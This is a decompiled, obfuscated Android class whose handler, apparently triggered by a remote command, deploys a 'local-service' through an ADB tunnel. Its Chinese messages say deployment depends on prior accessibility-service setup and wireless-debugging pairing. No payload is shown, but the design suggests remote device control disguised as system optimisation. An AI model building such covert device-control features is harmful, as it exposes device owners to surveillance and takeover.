package com.storm.safe.rock.service.modules.command;

import com.storm.safe.rock.service.modules.setup.C0360a2;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandler$handleDeployLocalService$1", m214403f = "AdbTunnelCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class AdbTunnelCommandHandler$handleDeployLocalService$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C0343a0 f53404a1;

    /* renamed from: a2 */
    public final /* synthetic */ uz0 f53405a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public AdbTunnelCommandHandler$handleDeployLocalService$1(InterfaceC0876mv interfaceC0876mv, uz0 uz0Var, C0343a0 c0343a0) {
        super(2, interfaceC0876mv);
        this.f53404a1 = c0343a0;
        this.f53405a2 = uz0Var;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new AdbTunnelCommandHandler$handleDeployLocalService$1(interfaceC0876mv, this.f53405a2, this.f53404a1);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        AdbTunnelCommandHandler$handleDeployLocalService$1 adbTunnelCommandHandler$handleDeployLocalService$1 = (AdbTunnelCommandHandler$handleDeployLocalService$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        adbTunnelCommandHandler$handleDeployLocalService$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        C1351vv c1351vv = C1351vv.f60710b1;
        uz0 uz0Var = this.f53405a2;
        C0343a0 c0343a0 = this.f53404a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            C0343a0.m211874a4(uz0Var, "deploy_started", "开始部署 local-service...");
            C0360a2 j41Var = C0360a2.f53810f9.getInstance();
            if (j41Var == null) {
                t60.m214704c5("AdbTunnelCmdHandler", "SystemOptimizeManager 未初始化");
                C0343a0.m211874a4(uz0Var, "deploy_failed", "服务未初始化，请先完成无障碍服务设置");
                return c1351vv;
            }
            if (!j41Var.m212051d9()) {
                t60.m214704c5("AdbTunnelCmdHandler", "★★★ local-service 部署失败 ★★★");
                C0343a0.m211874a4(uz0Var, "deploy_failed", "local-service 部署失败，请确保设备已完成无线调试配对");
                return c1351vv;
            }
            t60.m214714d6("AdbTunnelCmdHandler", "★★★ local-service 部署成功 ★★★");
            C0343a0.m211874a4(uz0Var, "deploy_success", "local-service 部署成功！");
            C0343a0.m211873a3(c0343a0, uz0Var.f60536a0);
            return c1351vv;
        } catch (Exception e) {
            t60.m214705c6("AdbTunnelCmdHandler", "部署 local-service 异常", e);
            C0343a0.m211874a4(uz0Var, "deploy_failed", "部署异常: " + e.getMessage());
            return c1351vv;
        }
    }
}
